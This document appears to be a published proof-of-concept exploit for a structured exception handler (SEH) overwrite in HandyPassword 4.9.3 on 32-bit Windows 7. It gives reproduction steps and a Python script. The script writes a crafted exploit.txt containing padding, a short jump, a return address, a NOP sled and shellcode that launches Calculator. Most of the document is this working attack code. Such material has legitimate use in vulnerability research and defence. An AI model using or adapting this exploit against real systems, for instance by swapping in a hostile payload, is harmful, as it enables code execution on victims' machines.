'''
********************************************************************************************
# Exploit Title: HandyPassword SEH-Over Write Exploit
# Date: 9/24/2015
# Exploit Author: Un_N0n
# Software Link: http://www.handypassword.com/download.shtml
# Version: 4.9.3
# Tested on: Windows 7 x86(32 BIT)
********************************************************************************************

[Steps to Produce the Crash]:
1- open 'HandyPassword.exe'.
2- Then From Menu Goto New Card->Simple Login Form.
3- Click on Create Card, Enter the contents of 'Exploit.txt' Created by script in the Title Field.
4- Enter Short Random value in the rest of the fields.
5- Click on OK
~ Calculator will appear and Software will Crash.

[Code to produce Exploit]: 
'''

junk = "A"*1144

nseh = "\xeb\x06\x90\x90" #JMP 6bytes
jmp ="\xB3\x27\x2F\x7F"  #0x7f2f27b3 From 

nops = "\x90"*50
shellcode = ("\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
"\x45\x81\x3e\x43\x72\x65\x61\x75"
"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
"\x6c\x63\x89\xe2\x52\x52\x53\x53"
"\x53\x53\x53\x53\x52\x53\xff\xd7");
junk2 = "D"*2000

file = open("exploit.txt",'w')
file.write(junk+nseh+jmp+nops+shellcode+junk2)
file.close()